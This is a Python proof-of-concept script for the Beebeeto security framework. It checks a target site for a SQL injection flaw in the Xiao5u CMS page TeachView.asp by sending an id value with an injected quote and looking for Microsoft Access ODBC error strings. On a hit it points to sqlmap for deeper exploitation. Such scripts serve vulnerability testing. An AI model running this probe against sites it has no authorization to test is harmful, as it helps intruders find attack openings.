#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import time
import urllib2
import urllib
import cookielib

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0032',# 由Beebeeto官方编辑
            'name': '校无忧建站系统 /TeachView.asp SQL注入漏洞 POC',  # 名称
            'author': 'beeOver',  # 作者
            'create_date': '2014-09-26',  # 编写日期
            },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
            },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Xiao5u',  # 漏洞所涉及的应用名称
            'vul_version': ['非商业授权所有版本'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['Xiao5u', 'TeachView.asp', 'Sql injection'],  # 漏洞相关tag
            'desc': 'Xiao5u cms website have sql injection error.',  # 漏洞描述
            'references': ['http://wooyun.org/bugs/wooyun-2014-065350',  # 参考链接
                ],
            },
        }


    @classmethod
    def verify(cls, args):
        attack_url_base = args['options']['target'] + "/TeachView.asp"
        attack_url = attack_url_base + "?id=99999999999%27"
        user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}
        request = urllib2.Request(attack_url,headers=user_agent)
        error_string = "Microsoft OLE DB Provider for ODBC Drivers"
        error_num = "80040e14"
        error_detail = "[Microsoft][ODBC Microsoft Access Driver]"

        try:
            response = urllib2.urlopen(request)
        except urllib2.URLError as e:
            if hasattr(e, 'code'):
                if e.getcode() == 500:
                    content = e.read()
                    if error_num in content and error_string in content and error_detail in content:
                    #如果报500错误且出现"[Microsoft][ODBC Microsoft Access Driver] 字符串的语法错误 在查询表达式 'id=59'' 中。"则说明漏洞存在
                        args['success'] = True
                        args['poc_ret']['vul_url'] = attack_url
                        args['poc_ret']['tips'] = "This website must have vulnerabilities, you can use sqlmap detect to get more information. "
                        #如果漏洞存在，则建议使用sqlmap等工具进行详细的检测
                        return args

        args["success"] = False
        args['poc_ret']['tips'] = "May be this website not have this bug."
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
